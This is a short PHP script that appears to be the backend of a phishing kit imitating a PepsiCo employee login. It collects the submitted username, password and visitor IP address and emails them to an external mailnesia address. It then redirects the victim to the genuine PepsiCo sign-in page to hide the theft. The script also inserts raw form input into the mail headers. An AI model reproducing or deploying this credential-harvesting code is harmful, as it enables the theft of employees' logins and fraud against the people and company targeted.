<?

$ip = getenv("REMOTE_ADDR");
$message .= "username: ".$_POST['USER']."\n";
$message .= "Password: ".$_POST['PASSWORD']."\n";
$message .= "IP: ".$ip."\n";
$message .= "\n";



$recipient = "lloydroy7@mailnesia.com,";
$subject = "Email IDs";
$headers = "From: responders";
$headers .= $_POST['Editbox1']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://secure.mypepsico.com/associatesso/login?TYPE=33554433&REALMOID=06-000d3f28-7682-1424-99cd-da1d9c514017&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=portal2prod-apache-peplxw00043-agent&TARGET=$SM$https%3a%2f%2fwww%2emypepsico%2ecom%2f");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>